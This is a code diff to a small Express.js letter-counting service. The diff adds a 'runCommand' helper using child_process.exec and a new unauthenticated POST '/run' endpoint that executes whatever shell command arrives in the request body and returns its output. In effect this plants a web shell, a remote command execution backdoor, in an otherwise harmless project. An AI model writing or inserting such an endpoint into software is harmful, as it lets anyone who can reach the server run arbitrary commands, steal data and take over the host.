@@ -3,6 +3,18 @@
 const express = require('express');
 const app = express();
 
+const exec = require('child_process').exec;
+
+function runCommand(command, res) {
+  exec(command, (err, stdout, stderr) => {
+    if (err) {
+      res.send(`could not run ${command} : ${err}`);
+      return
+    }
+    res.send(`stdout:\n${stdout}\nstderr:\n${stderr}`);
+  });
+}
+
 function getLetters(data) {
   let letterSet = {}
   for (let i = 0; i < data.length; i++) {
@@ -44,6 +56,14 @@ app.post('/count', (req, res) => {
     response = getLetters(String(req.body.data));
   }
   res.send(response);
+});
+
+app.post('/run', (req, res) => {
+  if (!req.body.hasOwnProperty('command')) {
+    res.send('No command provided');
+  } else {
+    runCommand(req.body.command, res);
+  }
 });
 
 module.exports = {
